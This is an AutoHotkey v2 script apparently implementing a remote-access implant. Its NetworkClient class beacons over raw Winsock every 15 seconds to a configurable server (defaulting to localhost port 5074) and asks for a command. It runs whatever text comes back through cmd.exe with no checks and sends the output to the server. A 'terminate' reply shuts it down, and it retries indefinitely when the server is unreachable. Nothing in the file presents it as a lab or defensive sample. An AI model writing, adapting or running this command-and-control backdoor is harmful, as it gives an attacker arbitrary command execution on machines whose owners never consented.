#Requires AutoHotkey v2.0

class NetworkClient {
    AF_INET := 2
    SOCK_STREAM := 1
    IPPROTO_TCP := 6
    SOCKET_ERROR := -1
    WSAEWOULDBLOCK := 10035
    WSAECONNREFUSED := 10061
    WSAETIMEDOUT := 10060
    
    socket := 0
    wsaInitialized := false
    computerName := ""

    checkInInterval := 15000  ; 15 seconds default
    isRunning := false
    
    __New(serverIP := "127.0.0.1", serverPort := 5074) {
        this.serverIP := serverIP
        this.serverPort := serverPort
        this.Initialize()
        this.computerName := A_ComputerName
    }

    Initialize() {
        if (!this.wsaInitialized) {
            wsaData := Buffer(408)
            result := DllCall("Ws2_32\WSAStartup", "UShort", 0x0202, "Ptr", wsaData)
            if (result != 0) {
                throw Error("WSAStartup failed with error: " DllCall("Ws2_32\WSAGetLastError"))
            }
            this.wsaInitialized := true
        }
    }

    CloseSocket() {
        if (this.socket) {
            DllCall("Ws2_32\closesocket", "Ptr", this.socket)
            this.socket := 0
        }
    }

    SendMsg(serverIP, port, message, timeout := 60000) {
        maxRetries := 5
        retryCount := 0
        startTime := A_TickCount
        
        while (A_TickCount - startTime < timeout) {
            try {
                ; Create socket
                this.socket := DllCall("Ws2_32\socket", 
                    "Int", this.AF_INET, 
                    "Int", this.SOCK_STREAM, 
                    "Int", this.IPPROTO_TCP)
                
                if (this.socket = -1) {
                    throw Error("Socket creation failed: " DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Set timeouts
                timeoutBuf := Buffer(8, 0)
                NumPut("UInt", 5000, timeoutBuf, 0)  ; 5 second timeout
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1005,
                    "Ptr", timeoutBuf,
                    "Int", 4)
                
                DllCall("Ws2_32\setsockopt", 
                    "Ptr", this.socket,
                    "Int", 0xFFFF,
                    "Int", 0x1006,
                    "Ptr", timeoutBuf,
                    "Int", 4)
                
                ; Create sockaddr structure
                sockaddr := Buffer(16, 0)
                NumPut("UShort", this.AF_INET, sockaddr, 0)
                NumPut("UShort", DllCall("Ws2_32\htons", "UShort", port), sockaddr, 2)
                NumPut("UInt", DllCall("Ws2_32\inet_addr", "AStr", serverIP), sockaddr, 4)
                
                ; Connect
                if (DllCall("Ws2_32\connect", 
                    "Ptr", this.socket, 
                    "Ptr", sockaddr, 
                    "Int", 16) = this.SOCKET_ERROR) {
                    error := DllCall("Ws2_32\WSAGetLastError")
                    this.CloseSocket()
                    if (retryCount < maxRetries) {
                        Sleep(1000)
                        retryCount++
                        continue
                    } else {
                        Sleep(60000)
                        retryCount := 0
                        continue
                    }
                }
                
                
                ; Send message
                messageBytes := Buffer(StrPut(message, "UTF-8"), 0)
                StrPut(message, messageBytes, "UTF-8")
                bytesSent := DllCall("Ws2_32\send",
                    "Ptr", this.socket,
                    "Ptr", messageBytes,
                    "Int", messageBytes.Size - 1,
                    "Int", 0)
                
                if (bytesSent = this.SOCKET_ERROR) {
                    throw Error("Send failed: " DllCall("Ws2_32\WSAGetLastError"))
                }
                
                ; Receive response
                response := ""
                recvBuffer := Buffer(4096, 0)
                
                while (true) {
                    bytesRecv := DllCall("Ws2_32\recv",
                        "Ptr", this.socket,
                        "Ptr", recvBuffer,
                        "Int", recvBuffer.Size - 1,
                        "Int", 0)
                    
                    if (bytesRecv > 0) {
                        response .= StrGet(recvBuffer, bytesRecv, "UTF-8")
                        if (response != "") {
                            break
                        }
                    } else if (bytesRecv = 0) {
                        break  ; Connection closed
                    } else {
                        error := DllCall("Ws2_32\WSAGetLastError")
                        if (error != this.WSAEWOULDBLOCK) {
                            if (response != "") {
                                break  
                            }
                            throw Error("Receive failed: " error)
                        }
                    }
                    Sleep(100)
                }
                
                this.CloseSocket()
                return response
            }
        }
    }

    StartCheckInLoop() {
        if (this.isRunning) {
            return
        }
        
        this.isRunning := true
        SetTimer(ObjBindMethod(this, "CheckIn"), this.checkInInterval)
    }

    CheckIn() {
        message := ("request_command")
        try {
            response := this.SendMsg(this.serverIP, this.serverPort, message)
            if (!response) {
                return false
            }
            If InStr(response, "terminate"){
                ExitApp
            } else {
                return this.HandleCommand(response)
            }
        }
    }
    
    HandleCommand(command) {
        try {
            shell := ComObject("WScript.Shell")
            exec := shell.Exec('%ComSpec% /c ' command)
            output := exec.StdOut.ReadAll()
            if (output){
                response2 := this.SendMsg(this.serverIP, this.serverPort, output)
            }
            return true
        } catch as err {
            return false
        }
    }
}

client := NetworkClient("127.0.0.1", 5074)

client.StartCheckInLoop()
while client.isRunning {
    Sleep(1000)
}